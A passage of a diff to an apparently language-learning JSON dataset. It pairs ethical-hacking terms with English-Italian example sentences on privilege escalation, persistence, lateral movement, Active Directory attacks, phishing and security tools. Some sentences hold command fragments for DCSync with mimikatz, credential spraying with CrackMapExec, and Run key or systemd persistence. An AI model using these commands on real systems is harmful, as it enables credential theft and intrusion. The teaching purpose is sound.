+        "example": "The Dirty Pipe kernel exploit (CVE-2022-0847) let any unprivileged user overwrite read-only files on Linux 5.8 and later. = L'exploit kernel Dirty Pipe (CVE-2022-0847) ha permesso a qualsiasi utente non privilegiato di sovrascrivere file di sola lettura su Linux 5.8 e successivi."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "UAC Bypass",
+      "set": {
+        "example": "A UAC bypass via fodhelper.exe let the operator elevate from medium to high integrity without prompting the logged-in user. = Un bypass UAC tramite fodhelper.exe ha permesso all'operatore di elevarsi da integrità media ad alta senza interrompere l'utente loggato."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Token Impersonation",
+      "set": {
+        "example": "With SeImpersonatePrivilege on the service account, the operator used token impersonation to spawn cmd.exe as SYSTEM. = Con SeImpersonatePrivilege sull'account di servizio, l'operatore ha usato l'impersonazione di token per generare cmd.exe come SYSTEM."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Potato Attack",
+      "set": {
+        "example": "The classic Potato Attack family (Hot, Rotten, Juicy, Rogue) exploits service-account NTLM relay to win SYSTEM on legacy Windows. = La classica famiglia Potato Attack (Hot, Rotten, Juicy, Rogue) sfrutta il relay NTLM dell'account di servizio per ottenere SYSTEM su Windows legacy."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "Persistence",
+      "set": {
+        "english": "Persistence Mechanism",
+        "italian": "meccanismo di persistenza",
+        "example": "A persistence mechanism like a scheduled task survives reboots, ensuring the operator keeps access without re-exploiting. = Un meccanismo di persistenza come uno scheduled task sopravvive ai reboot, garantendo all'operatore l'accesso senza ri-exploit."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "Scheduled Task",
+      "set": {
+        "example": "The operator installed a scheduled task that ran daily at 03:00 as SYSTEM, restoring the implant after every reboot. = L'operatore ha installato uno scheduled task che girava ogni giorno alle 03:00 come SYSTEM, ripristinando l'implant dopo ogni reboot."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "Run Key",
+      "set": {
+        "example": "Writing the implant path to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run as a Run Key launches it on every user logon. = Scrivere il percorso dell'implant in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run come Run Key lo lancia ad ogni logon dell'utente."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "Systemd Service",
+      "set": {
+        "example": "A rogue systemd service named 'updater.service' with WantedBy=multi-user.target relaunches the backdoor after every Linux reboot. = Un servizio systemd rogue chiamato 'updater.service' con WantedBy=multi-user.target rilancia la backdoor dopo ogni reboot di Linux."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "WMI Persistence",
+      "set": {
+        "example": "An attacker uses WMI persistence to register an event subscription that fires the implant whenever a chosen system event happens. = Un attaccante usa la persistenza WMI per registrare una event subscription che attiva l'implant ogni volta che si verifica un evento di sistema scelto."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_2",
+      "english": "DLL Hijacking",
+      "set": {
+        "example": "An unquoted service path plus a writable directory in PATH enabled DLL hijacking that ran SYSTEM code at next service start. = Un percorso di servizio non quotato più una directory scrivibile in PATH hanno abilitato un DLL hijacking che ha eseguito codice SYSTEM al successivo avvio del servizio."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "Pivoting",
+      "set": {
+        "english": "Network Pivoting Tunnel",
+        "italian": "tunnel di pivoting di rete",
+        "example": "A network pivoting tunnel through the compromised DMZ host gave the team SOCKS access to internal 10.0.0.0/8 subnets. = Un tunnel di pivoting di rete attraverso l'host DMZ compromesso ha dato al team accesso SOCKS alle subnet interne 10.0.0.0/8."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "Lateral Movement",
+      "set": {
+        "english": "Lateral Movement Technique",
+        "italian": "tecnica di movimento laterale",
+        "example": "The team chose a lateral movement technique like PsExec over WMI based on which one would generate the least telemetry. = Il team ha scelto una tecnica di movimento laterale come PsExec su WMI basandosi su quale generasse meno telemetria."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "WinRM",
+      "set": {
+        "italian": "WinRM",
+        "example": "Using evil-winrm with a captured NetNTLMv2 hash gave the operator an interactive PowerShell on the file server via port 5985. = Usando evil-winrm con un hash NetNTLMv2 catturato ha dato all'operatore una PowerShell interattiva sul file server tramite la porta 5985."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "PsExec",
+      "set": {
+        "italian": "PsExec",
+        "example": "The classic PsExec drops a temporary service named PSEXESVC on the target and is one of the most noisy lateral moves in Windows. = Il classico PsExec lascia un servizio temporaneo chiamato PSEXESVC sul target ed è uno dei movimenti laterali più rumorosi in Windows."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "WMI Lateral",
+      "set": {
+        "example": "A WMI lateral move via Invoke-WmiMethod -ComputerName -Class Win32_Process avoids dropping a service, making it stealthier than PsExec. = Un movimento laterale WMI tramite Invoke-WmiMethod -ComputerName -Class Win32_Process evita di lasciare un servizio, rendendolo più stealth di PsExec."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "DCOM",
+      "set": {
+        "italian": "DCOM",
+        "example": "Lateral movement via DCOM using MMC20.Application or ExcelDDE blends with Office traffic and bypasses many SMB-focused detections. = Il movimento laterale via DCOM usando MMC20.Application o ExcelDDE si confonde col traffico Office e bypassa molte detection focalizzate su SMB."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "Impacket",
+      "set": {
+        "italian": "Impacket",
+        "example": "From a Linux jump box, Impacket's wmiexec.py spawned a semi-interactive shell on the file server via WMI without dropping any binary. = Da un jump box Linux, il wmiexec.py di Impacket ha generato una shell semi-interattiva sul file server via WMI senza lasciare un binario."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "CrackMapExec",
+      "set": {
+        "italian": "CrackMapExec",
+        "example": "One CrackMapExec smb 10.0.0.0/24 -u user -p pass run sprayed credentials across the subnet and listed every share the user could see. = Una sola esecuzione di CrackMapExec smb 10.0.0.0/24 -u user -p pass ha effettuato lo spray credenziali sulla subnet ed elencato ogni share visibile all'utente."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "NetExec",
+      "set": {
+        "italian": "NetExec",
+        "example": "On modern engagements, NetExec (the maintained CrackMapExec fork) bundles cleaner SMB, WinRM, MSSQL, LDAP, and SSH modules. = Negli engagement moderni, NetExec (il fork mantenuto di CrackMapExec) include moduli SMB, WinRM, MSSQL, LDAP e SSH più puliti."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_3",
+      "english": "BloodHound",
+      "set": {
+        "italian": "BloodHound",
+        "example": "After ingesting a SharpHound collection, BloodHound surfaced a 3-hop path from a help-desk user straight to Domain Admins. = Dopo aver ingerito una raccolta SharpHound, BloodHound ha rivelato un percorso a 3 salti da un utente help-desk direttamente a Domain Admins."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "Active Directory",
+      "set": {
+        "italian": "Active Directory",
+        "example": "In an internal pentest, mapping Active Directory trust relationships is step zero before any Kerberoasting or DCSync attempt. = In un pentest interno, mappare le relazioni di trust di Active Directory è il passo zero prima di qualsiasi tentativo di Kerberoasting o DCSync."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "Kerberos",
+      "set": {
+        "italian": "Kerberos",
+        "example": "Most Active Directory attacks chain Kerberos abuses like Kerberoasting and pass-the-ticket rather than touching NTLM at all. = La maggior parte degli attacchi Active Directory concatena abusi di Kerberos come Kerberoasting e pass-the-ticket piuttosto che toccare NTLM."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "Kerberoasting",
+      "set": {
+        "example": "Any domain user can request service tickets and crack them offline, which is exactly why Kerberoasting is so common in red team ops. = Qualsiasi utente di dominio può richiedere service ticket e crackarli offline, ed è esattamente per questo che il Kerberoasting è così comune nelle operazioni red team."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "AS-REP Roasting",
+      "set": {
+        "example": "Accounts flagged DONT_REQ_PREAUTH let any attacker fetch an AS-REP and crack it offline, the foundation of AS-REP Roasting. = Account con il flag DONT_REQ_PREAUTH permettono a qualsiasi attaccante di ottenere un AS-REP e crackarlo offline, il fondamento dell'AS-REP Roasting."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "DCSync",
+      "set": {
+        "example": "With Replicating Directory Changes rights, mimikatz lsadump::dcsync /user:krbtgt impersonates a DC and pulls the KRBTGT hash silently. = Con i diritti Replicating Directory Changes, mimikatz lsadump::dcsync /user:krbtgt impersona un DC ed estrae l'hash KRBTGT silenziosamente."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "DCShadow",
+      "set": {
+        "example": "An attack named DCShadow registers a rogue domain controller just long enough to push AD changes, sidestepping most DC-write detections. = Un attacco chiamato DCShadow registra un domain controller rogue giusto il tempo di spingere modifiche AD, eludendo le detection sulle scritture DC."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "Constrained Delegation",
+      "set": {
+        "example": "Through constrained delegation, a service can impersonate a user but only to a whitelisted target service, limiting blast radius. = Tramite la delega vincolata, un servizio può impersonare un utente ma solo verso un servizio target in whitelist, limitando il raggio d'azione."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_4",
+      "english": "Unconstrained Delegation",
+      "set": {
+        "example": "Any host with unconstrained delegation stores incoming TGTs in memory, making it a prime target for credential theft and DA takeover. = Qualsiasi host con delega non vincolata memorizza i TGT in arrivo in memoria, rendendolo un target principale per il furto credenziali e la takeover DA."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Phishing",
+      "set": {
+        "example": "A typical phishing email impersonates Microsoft 365 password expiry and links to a credential-harvesting clone of the login page. = Una tipica email di phishing impersona la scadenza password di Microsoft 365 e linka a un clone di login per la raccolta credenziali."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Spear Phishing",
+      "set": {
+        "example": "A spear phishing attempt against the CFO referenced last quarter's earnings call and her actual travel calendar to look legitimate. = Un tentativo di spear phishing contro la CFO faceva riferimento all'ultima earnings call e al suo vero calendario di viaggi per sembrare legittimo."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Whaling",
+      "set": {
+        "example": "A whaling attack against the CEO carried a fake board PDF that, once opened, dropped a credential-stealing implant on the laptop. = Un attacco whaling contro il CEO portava un finto PDF del board che, una volta aperto, ha lasciato un implant ruba-credenziali sul laptop."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Vishing",
+      "set": {
+        "example": "A vishing call posing as IT support tricked a junior employee into reading her MFA push prompt aloud over the phone. = Una chiamata di vishing che si fingeva supporto IT ha ingannato una dipendente junior facendole leggere il prompt MFA push ad alta voce al telefono."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Smishing",
+      "set": {
+        "example": "A smishing campaign claiming a failed UPS delivery harvested credit card details from 200+ recipients in under 12 hours. = Una campagna di smishing che dichiarava una consegna UPS fallita ha raccolto dettagli di carte di credito da oltre 200 destinatari in meno di 12 ore."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Clone Phishing",
+      "set": {
+        "example": "In clone phishing the attacker forwards a legitimate prior email but swaps the attachment or link for a malicious one. = Nel clone phishing l'attaccante inoltra una email legittima precedente ma scambia l'allegato o il link con uno malevolo."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "BEC",
+      "set": {
+        "example": "A BEC attempt impersonated the CFO and asked the AP team to wire $180k for an 'urgent acquisition' before the bank closed. = Un tentativo BEC ha impersonato il CFO e ha chiesto al team AP di bonificare 180k$ per un'acquisizione urgente prima della chiusura della banca."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Phishing Kit",
+      "set": {
+        "example": "A leaked phishing kit deployed a pixel-perfect Microsoft login page with backend exfiltration to an attacker-controlled Telegram bot. = Un phishing kit trapelato ha distribuito una pagina di login Microsoft pixel-perfect con esfiltrazione backend verso un bot Telegram controllato dall'attaccante."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Evilginx",
+      "set": {
+        "italian": "Evilginx",
+        "example": "During the test, Evilginx ran a transparent reverse proxy that captured session cookies from a real Microsoft login, defeating push MFA. = Durante il test, Evilginx ha eseguito un reverse proxy trasparente che ha catturato i cookie di sessione da un login Microsoft reale, sconfiggendo l'MFA push."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_1",
+      "english": "Phishing Awareness",
+      "set": {
+        "example": "Quarterly phishing awareness simulations dropped click rates from 22% to under 4% across the EMEA workforce within one year. = Simulazioni trimestrali di phishing awareness hanno ridotto il tasso di click dal 22% a meno del 4% sulla forza lavoro EMEA in un anno."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Pretexting",
+      "set": {
+        "example": "A successful pretexting call cast the operator as an external auditor needing 'quick' access to the timesheet portal before payday. = Una chiamata di pretexting riuscita ha presentato l'operatore come un auditor esterno che aveva bisogno di accesso veloce al portale timesheet prima del payday."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Tailgating",
+      "set": {
+        "example": "A tailgating attempt at the lobby succeeded when a polite employee held the door for a stranger carrying coffee and a delivery box. = Un tentativo di tailgating nella lobby è riuscito quando un dipendente gentile ha tenuto la porta per uno sconosciuto con caffè e una scatola di consegna."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Piggybacking",
+      "set": {
+        "example": "An attack via piggybacking through the data-center mantrap got the tester past the badge reader without showing any credential. = Un attacco via piggybacking attraverso il mantrap del data-center ha portato il tester oltre il badge reader senza mostrare alcuna credenziale."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Baiting",
+      "set": {
+        "example": "A baiting drop scattered USB sticks labeled 'Q4 Bonuses' in the parking lot; three executives plugged them into laptops within two days. = Un drop di baiting ha sparso chiavette USB etichettate 'Bonus Q4' nel parcheggio; tre dirigenti le hanno collegate ai laptop in due giorni."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Quid Pro Quo",
+      "set": {
+        "example": "A quid pro quo attack offered free 'tech support' to employees in exchange for their domain credentials over the phone. = Un attacco quid pro quo offriva supporto tecnico gratuito ai dipendenti in cambio delle loro credenziali di dominio al telefono."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Impersonation",
+      "set": {
+        "example": "The operator's impersonation of a fire-safety inspector relied on a printed clipboard and a high-vis vest to bypass reception. = L'impersonazione di un ispettore antincendio da parte dell'operatore si basava su una clipboard stampata e un gilet ad alta visibilità per bypassare la reception."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Urgency",
+      "set": {
+        "example": "Fake urgency in a BEC email like 'wire by 5pm or lose the deal' is the single strongest manipulation lever attackers exploit. = Una falsa urgenza in una email BEC come 'bonifica entro le 17 o perdiamo l'affare' è la singola leva di manipolazione più forte sfruttata dagli attaccanti."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Scarcity",
+      "set": {
+        "example": "A phishing landing page invoked scarcity, claiming only 12 free licenses remained, to push targets through the credential form fast. = Una pagina di phishing invocava la scarsità, dichiarando che restavano solo 12 licenze gratis, per spingere i target attraverso la form credenziali in fretta."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_2",
+      "english": "Rapport Building",
+      "set": {
+        "example": "Twenty minutes of rapport building on LinkedIn made the same phishing message land far better than a cold direct ask. = Venti minuti di rapport building su LinkedIn hanno fatto sì che lo stesso messaggio di phishing avesse un esito molto migliore di una richiesta diretta a freddo."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "SET",
+      "set": {
+        "example": "During the awareness exercise, the team used SET to clone the corporate SSO page and harvest credentials from volunteer testers. = Durante l'esercitazione di awareness, il team ha usato SET per clonare la pagina SSO aziendale e raccogliere credenziali dai tester volontari."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Gophish",
+      "set": {
+        "italian": "Gophish",
+        "example": "During the campaign, Gophish ran a tracked phishing batch of 2000 emails with per-recipient links and full click and submission stats. = Durante la campagna, Gophish ha eseguito un batch phishing tracciato di 2000 email con link per destinatario e statistiche complete di click e submission."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "KnowBe4",
+      "set": {
+        "italian": "KnowBe4",
+        "example": "A KnowBe4 quarterly phishing simulation tracks click rates per department and feeds tailored micro-training to repeat offenders. = Una simulazione di phishing trimestrale di KnowBe4 traccia i tassi di click per dipartimento e somministra micro-training mirato ai recidivi."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "King Phisher",
+      "set": {
+        "italian": "King Phisher",
+        "example": "For the red-team test, King Phisher handled campaign infrastructure, server-side templates, and click tracking for 1500 recipients. = Per il test red-team, King Phisher ha gestito infrastruttura della campagna, template server-side e tracking dei click per 1500 destinatari."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "theHarvester",
+      "set": {
+        "english": "theHarvester Subdomain Scan",
+        "italian": "scan sottodomini con theHarvester",
+        "example": "A theHarvester subdomain scan with theHarvester -d target.com -b crtsh,bing pulled 130 unique hostnames in under a minute. = Una scansione di sottodomini con theHarvester -d target.com -b crtsh,bing ha estratto 130 hostname unici in meno di un minuto."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Maltego",
+      "set": {
+        "english": "Maltego Transform",
+        "italian": "trasformazione Maltego",
+        "example": "A Maltego transform pivoted from a single corporate email domain to 80 employee LinkedIn profiles for the social-engineering brief. = Una trasformazione Maltego è passata da un singolo dominio email aziendale a 80 profili LinkedIn di dipendenti per il brief di ingegneria sociale."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Hunter.io",
+      "set": {
+        "italian": "Hunter.io",
+        "example": "In thirty seconds, Hunter.io returned 240 likely-valid email addresses for the target domain plus the source page of each address. = In trenta secondi, Hunter.io ha restituito 240 indirizzi email probabilmente validi per il dominio target più la pagina sorgente di ciascun indirizzo."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "OSINT for SE",
+      "set": {
+        "example": "Two days of OSINT for SE turned a generic phishing brief into a tailored pretext citing the target's recent vendor migration. = Due giorni di OSINT per ingegneria sociale hanno trasformato un brief di phishing generico in un pretesto su misura che citava la recente migrazione vendor del target."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "LinkedIn OSINT",
+      "set": {
+        "example": "Two hours of LinkedIn OSINT mapped the entire IT department's reporting line, marking the helpdesk lead as softest SE target. = Due ore di OSINT LinkedIn hanno mappato l'intera reporting line del dipartimento IT, segnando il lead helpdesk come il target SE più morbido."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_3",
+      "english": "Email Spoofing",
+      "set": {
+        "example": "Without SPF or DMARC enforcement, basic email spoofing of finance@target.com landed straight in the inbox of every accounts-payable user. = Senza enforcement di SPF o DMARC, un semplice email spoofing di finance@target.com è arrivato direttamente in inbox a ogni utente di contabilità."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Security Awareness",
+      "set": {
+        "example": "A mandatory annual security awareness module includes phishing recognition, MFA hygiene, and how to report suspicious emails quickly. = Un modulo annuale obbligatorio di security awareness include riconoscimento phishing, igiene MFA e come segnalare velocemente email sospette."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "SPF",
+      "set": {
+        "italian": "SPF",
+        "example": "A correctly authored SPF record lists only the mail servers allowed to send for the domain, blunting basic envelope-sender spoofing. = Un record SPF scritto correttamente elenca solo i mail server autorizzati a inviare per il dominio, smussando lo spoofing base dell'envelope-sender."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "DKIM",
+      "set": {
+        "italian": "DKIM",
+        "example": "Outbound mail is signed with a DKIM private key so receivers can verify the signature against the public key published in DNS. = La posta in uscita viene firmata con una chiave privata DKIM così i destinatari possono verificare la firma con la chiave pubblica pubblicata in DNS."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "DMARC",
+      "set": {
+        "italian": "DMARC",
+        "example": "A DMARC policy set to p=reject tells receivers to drop unauthenticated mail claiming to be from the domain, killing direct spoofing. = Una policy DMARC impostata su p=reject dice ai destinatari di scartare la posta non autenticata che dichiara di provenire dal dominio, eliminando lo spoofing diretto."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Phishing Reporting",
+      "set": {
+        "example": "A one-click phishing reporting button in Outlook forwards the suspect email to SOC with full headers for triage within minutes. = Un bottone phishing reporting a un click in Outlook inoltra l'email sospetta al SOC con header completi per il triage in pochi minuti."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Email Gateway",
+      "set": {
+        "example": "The secure email gateway sandboxed every link and attachment before delivery, blocking 92% of payloads in the latest quarterly report. = L'email gateway sicuro ha messo in sandbox ogni link e allegato prima della consegna, bloccando il 92% dei payload nell'ultimo report trimestrale."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Sandbox Detonation",
+      "set": {
+        "example": "Through sandbox detonation of the suspicious .docm in a disposable VM, the SOC revealed a PowerShell stager beaconing to a fresh domain. = Tramite la detonazione in sandbox del .docm sospetto in una VM usa-e-getta, il SOC ha rivelato uno stager PowerShell che faceva beaconing verso un dominio nuovo."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Verification Procedure",
+      "set": {
+        "example": "Any wire over 50k triggers a verification procedure: a callback on the known number to the requesting executive before sending. = Qualsiasi bonifico oltre 50k attiva una procedura di verifica: una callback al numero noto del dirigente richiedente prima dell'invio."
+      }
+    },
+    {
+      "level": "12",
+      "lesson": "ethack_social_engineering_4",
+      "english": "Zero Trust",
+      "set": {
+        "example": "A Zero Trust posture re-authenticates and re-authorizes every request, so a single phished credential no longer opens the whole network. = Una postura Zero Trust ri-autentica e ri-autorizza ogni richiesta, così una singola credenziale phishata non apre più tutta la rete."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Metasploit",
+      "set": {
+        "italian": "Metasploit",
+        "example": "The exploitation phase used Metasploit's auxiliary scanner first, then loaded an exploit module that matched the discovered service banner. = La fase di exploitation ha usato prima lo scanner auxiliary di Metasploit, poi ha caricato un exploit module che corrispondeva al banner del servizio scoperto."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "msfconsole",
+      "set": {
+        "italian": "msfconsole",
+        "example": "Inside msfconsole the operator chained 'workspace -a engagement', 'db_nmap -sV 10.0.0.0/24', and 'services' to seed the next phase. = Dentro msfconsole l'operatore ha concatenato 'workspace -a engagement', 'db_nmap -sV 10.0.0.0/24' e 'services' per preparare la fase successiva."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Auxiliary Module",
+      "set": {
+        "example": "An auxiliary module like smb_version probes services without exploitation, mapping the attack surface before any payload fires. = Un auxiliary module come smb_version sonda i servizi senza exploitation, mappando la superficie d'attacco prima che qualsiasi payload parta."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Exploit Module",
+      "set": {
+        "example": "Selecting the right exploit module in Metasploit means matching service version, target architecture, and payload type carefully. = Selezionare il giusto exploit module in Metasploit significa abbinare con cura versione del servizio, architettura target e tipo di payload."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Post Module",
+      "set": {
+        "example": "After a Meterpreter session opens, a post module like post/multi/recon/local_exploit_suggester surfaces privesc paths automatically. = Dopo che si apre una sessione Meterpreter, un post module come post/multi/recon/local_exploit_suggester rivela automaticamente i percorsi di privesc."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Workspace",
+      "set": {
+        "italian": "Workspace",
+        "example": "Per-engagement workspace separation in Metasploit keeps host, service, and credential data from different clients from cross-contaminating. = La separazione per-engagement con workspace in Metasploit evita la contaminazione incrociata di dati host, servizi e credenziali tra clienti diversi."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Sessions",
+      "set": {
+        "example": "Once three Meterpreter sessions are open, 'sessions -i 2' drops the operator into shell 2 for interactive post-exploitation work. = Quando sono aperte tre sessioni Meterpreter, 'sessions -i 2' porta l'operatore nella shell 2 per il lavoro interattivo di post-exploitation."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Resource Script",
+      "set": {
+        "example": "A Metasploit resource script (.rc) automates a recurring workflow: load workspace, run a scan, and launch a known-good exploit. = Uno script di risorsa Metasploit (.rc) automatizza un flusso ricorrente: carica workspace, lancia una scansione e avvia un exploit collaudato."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_1",
+      "english": "Armitage",
+      "set": {
+        "italian": "Armitage",
+        "example": "During the lab exercise, Armitage gave the trainee a graphical view of host, service, and session state on top of Metasploit. = Durante l'esercizio di laboratorio, Armitage ha dato al tirocinante una vista grafica di host, servizi e sessioni sopra Metasploit."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Nmap",
+      "set": {
+        "italian": "Nmap",
+        "example": "The recon phase always opens with Nmap -sV -sC against a small target list to enumerate service versions and run default scripts. = La fase di recon apre sempre con Nmap -sV -sC contro una piccola lista di target per enumerare versioni di servizi e lanciare gli script di default."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "OS Detection",
+      "set": {
+        "example": "Nmap's -O flag enables OS detection, fingerprinting the TCP/IP stack to guess Windows Server 2019 versus a Linux 5.x kernel. = Il flag -O di Nmap abilita l'OS detection, fingerprintando lo stack TCP/IP per indovinare Windows Server 2019 contro un kernel Linux 5.x."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "NSE",
+      "set": {
+        "example": "An NSE script like smb-vuln-ms17-010 flagged every host still vulnerable to EternalBlue across the target subnet in under a minute. = Uno script NSE come smb-vuln-ms17-010 ha segnalato in meno di un minuto ogni host ancora vulnerabile a EternalBlue sulla subnet target."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Zenmap",
+      "set": {
+        "italian": "Zenmap",
+        "example": "For the trainee, Zenmap visualized the host topology and let them compare scan results from two different days side by side. = Per il tirocinante, Zenmap ha visualizzato la topologia degli host e gli ha permesso di confrontare risultati di scansione di due giorni diversi."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "Masscan",
+      "set": {
+        "italian": "Masscan",
+        "example": "On the external test, masscan -p1-65535 --rate 10000 10.0.0.0/16 finished a full TCP sweep across a /16 in roughly six minutes. = Sul test esterno, masscan -p1-65535 --rate 10000 10.0.0.0/16 ha finito uno sweep TCP completo su una /16 in circa sei minuti."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_2",
+      "english": "RustScan",
+      "set": {
+        "italian": "RustScan",
+        "example": "By chaining output, RustScan piped open ports straight into Nmap -sV, cutting recon time on a /24 from twelve minutes to under three. = Concatenando l'output, RustScan ha passato le porte aperte direttamente a Nmap -sV, riducendo il tempo di recon su una /24 da dodici a meno di tre minuti."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Wireshark",
+      "set": {
+        "italian": "Wireshark",
+        "example": "The forensic team opened the offending pcap in Wireshark and followed the TCP stream to reconstruct the exfiltrated SQL dump. = Il team forensic ha aperto il pcap incriminato in Wireshark e ha seguito lo stream TCP per ricostruire il dump SQL esfiltrato."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Display Filter",
+      "set": {
+        "example": "A display filter like 'http.request.method == \"POST\" && ip.addr == 10.0.0.5' isolated the suspicious uploads in the noisy capture. = Un display filter come 'http.request.method == \"POST\" && ip.addr == 10.0.0.5' ha isolato gli upload sospetti nella cattura rumorosa."
+      }
